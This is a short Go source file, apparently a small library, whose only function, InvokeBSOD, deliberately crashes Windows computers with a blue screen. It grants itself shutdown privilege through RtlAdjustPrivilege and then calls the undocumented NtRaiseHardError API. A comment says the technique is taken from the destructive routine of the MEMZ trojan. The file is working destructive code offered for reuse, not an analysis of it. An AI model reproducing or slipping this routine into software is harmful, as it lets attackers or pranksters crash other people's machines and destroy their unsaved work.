package golibmagic

import (
	"errors"
	"runtime"
	"syscall"
	"unsafe"
)

var (
	ErrNotWindows = errors.New("golibmagic: computer is not running Microsoft Windows")
	ErrFailedBSOD = errors.New("golibmagic: failed to induce a BSOD on computer")
)

var (
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
)

var (
	NtErrorCode = 0xc0000022
)

var (
	tempBool   bool
	tempString string
)

/*
InvokeBSOD attempts to induce a BSOD on a computers running Microsoft Windows using undocumented functions within the Windows API.
This function shouldn't ever return an error, unless it failed in invoking a BSOD on the running system, or the system isn't running Microsoft Windows.
*/
func InvokeBSOD() error {
	// Check if computer is running Microsoft Windows
	if runtime.GOOS == "windows" {
		/*
		 Try forcing BSOD using undocumentated functions from Windows API
		 Credit to Leurak: https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18
		*/
		RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&tempBool)))
		NtRaiseHardError.Call(uintptr(NtErrorCode), 0, 0, 0, 6, uintptr(unsafe.Pointer(&tempString)))
		return ErrFailedBSOD
	}
	return ErrNotWindows
}
